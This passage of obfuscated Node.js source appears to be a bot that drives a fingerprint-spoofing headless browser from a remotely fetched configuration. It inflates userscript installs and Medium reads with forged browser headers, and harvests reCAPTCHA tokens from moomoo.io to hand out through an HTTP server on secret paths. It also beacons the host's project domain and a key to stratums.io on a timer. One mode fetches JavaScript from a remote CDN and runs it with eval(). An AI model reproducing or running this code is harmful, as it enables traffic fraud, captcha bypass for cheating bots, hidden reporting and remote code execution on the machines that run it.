      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + Z(0x24) + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x21) + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + a1(0x29, '!FOC') + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + Z(0xa) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + a0(0x15) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a1(0x1a, 'EgJ3') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a1(0x2a, '^RaX') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    Z(0x22) + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    a1(0x14, 'mTbY') + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + Z(0x1) + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + Z(0x10) + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x257 * -0x3 + -0x752 * 0x4 + 0x244d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a3 = c,
      a2 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x371 * 0x5 + -0xaa7 + -0x347 * 0x2)[a2(0xe) + 'nchOptions'](pptOptions)[a3(0xb)]([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k[a3(0x28) + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 * -0x1c3b + 0xb * 0x68 + 0x2af * 0x9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x26c + 0xd09 + -0xa39), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x214c + -0x1 * 0x1e8 + -0x1f64;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xd87 + 0x22db * -0x1 + 0x16c * 0xf; w < getRandomInt(0x9fa + 0x1e07 + -0x2800, 0x24fe + 0x2150 * -0x1 + -0x3a9 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * 0x11d1d + 0xaa9 + -0x3d66);
        }
      }();
    }, 0x240c + -0x7da + -0x1bce), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1a8d + -0x221 + -0x1 * -0x1cae;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1a81 + -0x1821 + 0x2 * 0x1951, 0x1 * 0x1acd + 0x16e6 * 0x1 + -0x1d * 0x1b5)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x34e1 + 0x80f9 + 0x2918);
    }, 0x1 * -0xa03 + 0x462 + -0x43 * -0x17), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2 * -0x117e + -0xf3b + 0x3237;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xe * -0x1de + -0x153a + -0x9d9 * -0x6), await u['evaluate'](() => {
            const a4 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + a4(0x27) + 'me/cdn/xm7' + '7/wp.js', -0x1eec + -0x118d + -0x3079 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x13 * 0x2130 + -0x17f4af + 0x2826df);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x167b + 0x4c4 * 0x8 + -0xc0b * 0x5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xdc1 + 0x606 * 0x1 + -0x1 * -0x883);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x5d1 * 0x5 + 0x25df + 0x5 * 0x48e);
}
doFlags['doOUJS'] && ((async () => {
  const a9 = c,
    a8 = d,
    a7 = b;
  async function f() {
    const a6 = b,
      a5 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xba0 + 0x1f2b + -0x2aca) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xb7d + 0x5 * 0x502 + -0xd8c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x977 + 0x270f + -0x3086, D['indexOf']('\x20'));
        return B ? E['slice'](0x2637 + 0xa75 * 0x2 + -0x3b21, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2 * -0x2533 + -0x19f * -0x6 + -0x2d10),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + a5(0x16) + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + a5(0x4),
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x[a6(0x1c, '@eG#')]['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2 * 0xd46 + 0xb * -0x1cc + -0x2ab * -0x20),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + a6(0x6, 'Ro7N') + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': a6(0xc, 'uslS') + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z[a5(0x1b)], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + a7(0x23, 'hVfx') + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + a8(0x0) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
